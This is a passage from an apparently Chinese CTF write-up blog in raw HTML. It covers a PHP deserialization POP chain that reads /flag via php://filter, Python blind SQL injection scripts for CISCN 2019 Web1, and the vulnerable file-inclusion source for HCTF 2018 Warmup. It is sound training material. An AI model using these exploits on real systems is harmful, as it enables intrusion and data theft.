data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/file|ftp|http|https|gopher|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You can Not Enter 2022\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Try_Work_Hard</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Make_a_Change</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$effort</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">/**********************Try to See flag.php*****************************/</span></span></pre></td></tr></table></figure><p>废话不多说上链子：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Road_is_Long</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Try_Work_Hard</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/convert.base64-encode/resource=/flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Make_a_Change</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$effort</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Make_a_Change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Try_Work_Hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h2 id=\"2023919\"><a class=\"anchor\" href=\"#2023919\">#</a> 2023/9/19</h2>\n<h3 id=\"ciscn-2019华北day2web1\"><a class=\"anchor\" href=\"#ciscn-2019华北day2web1\">#</a> [CISCN 2019 华北 Day2] Web1</h3>\n<h4 id=\"sql注入布尔盲注空格绕过\"><a class=\"anchor\" href=\"#sql注入布尔盲注空格绕过\">#</a> SQL 注入，布尔盲注，空格绕过。</h4>\n<p>进入题目，提示：</p>\n<blockquote>\n<p>All You Want Is In Table 'flag' and the column is 'flag'</p>\n<p>Now, just give the id of passage</p>\n</blockquote>\n<p>输入 1 得到回显</p>\n<blockquote>\n<p>Hello, glzjin wants a girlfriend.</p>\n</blockquote>\n<p>输入 2 得到回显</p>\n<blockquote>\n<p>Do you want to be my girlfriend?</p>\n</blockquote>\n<p>输入 if (1=1,1,2) 得到回显：</p>\n<blockquote>\n<p>Hello, glzjin wants a girlfriend.</p>\n</blockquote>\n<p>上盲注：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>burp0_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://node4.anna.nssctf.cn:28215/\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> string<span class=\"token punctuation\">.</span>printable<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        sql <span class=\"token operator\">=</span> <span class=\"token string\">'if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        burp0_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> sql<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>burp0_url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>burp0_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"Hello\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            flag <span class=\"token operator\">+=</span> j</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr></table></figure><p>也可以使用异或的方法，用它可以起到代替 or 的作用。<br />\n0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)<br />\n 但还有一些是没有用异或，用的是 if，可 if 有局限性，在 id 为数字型时，可以直接 select * from users where id=if (1=1,1,0)，但如果 id 单引号字符型或双引号字符型，那就必须在 if 前加 or 或 and。</p>\n<p>可以用二分法增加速度：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>burp0_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://node4.anna.nssctf.cn:28215/\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    l <span class=\"token operator\">=</span> <span class=\"token number\">30</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    r <span class=\"token operator\">=</span> <span class=\"token number\">130</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">+</span> l<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> l <span class=\"token operator\">&lt;</span> r<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        sql <span class=\"token operator\">=</span> <span class=\"token string\">'0^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))>&#123;&#125;)'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        burp0_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> sql<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        res <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>burp0_url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>burp0_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"Hello\"</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            l <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            r <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>l <span class=\"token operator\">+</span> r<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"\u001e\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag:\"</span> <span class=\"token operator\">+</span> flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"hctf-2018warmup\"><a class=\"anchor\" href=\"#hctf-2018warmup\">#</a> [HCTF 2018]Warmup</h3>\n<h4 id=\"文件包含目录穿越php\"><a class=\"anchor\" href=\"#文件包含目录穿越php\">#</a> 文件包含，目录穿越，PHP。</h4>\n<p>进入题目是个滑稽图片，别管他，直接检查源代码：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;!--source.php--></pre></td></tr></table></figure><p>行，直接访问。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">emmm</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">emmm</span><span class=\"token operator\">::</span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">include</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>审计一下，大致明白了必须想办法绕过 checkFile 函数，而绕过点就在这句：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span 